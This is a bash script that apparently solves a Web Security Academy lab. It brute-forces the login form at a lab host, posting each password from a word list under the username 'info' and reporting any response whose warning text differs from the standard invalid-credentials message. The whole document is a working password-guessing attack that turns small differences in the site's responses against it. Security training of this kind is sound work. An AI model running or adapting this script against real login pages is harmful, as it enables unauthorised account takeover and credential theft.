#!/usr/bin/env bash

HOST="0a13002a04343cd980e4f4ae00a700cf.web-security-academy.net"
INVALID_PASSWORD_MSG="Invalid username or password "

while IFS= read -r password; do
  msg=$(
    curl -s -X POST "https://$HOST/login" \
      --data-urlencode "username=info" \
      --data-urlencode "password=$password" \
      | grep -oP '<p class=is-warning>\K.*(?=</p>)'
  )

  if [[ "$msg" != "$INVALID_PASSWORD_MSG" ]]; then
    echo "[+] Possible valid password found: $password"
    echo "[+] Response: '$msg'"
  fi
done < pass_list.txt
